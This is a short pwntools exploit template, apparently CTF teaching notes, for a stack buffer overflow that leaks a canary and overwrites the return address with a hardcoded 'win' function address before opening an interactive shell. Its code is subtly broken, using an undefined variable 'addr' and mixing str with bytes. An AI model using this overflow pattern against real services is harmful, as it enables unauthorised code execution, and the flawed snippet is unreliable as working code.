from pwn import *
context.log_level="debug"

# For offline exploits.
p = process('./bof.o')

# Netcat pwn.
p = remote("url", PORT)

# Recieve until the end of specified text.
p.recvuntil("\nStack Canary\t\t: ")

# Combine with first recvuntil to save information into a var.
example_addr = p64(int(p.recvuntil("\n"),16))

# You can hardcode addresses.
# See below for more information.
win = p64(int(b"0x400bea",16))

# Send something.
p.sendline(b"A"*24 + addr + b"A"*8 + win + "\x00")


# to deal withh python3 byte wrangling issues, one can define a buffer as such
buffer = b"A"*100
# said sean

# Switch to interactive mode.
p.interactive()
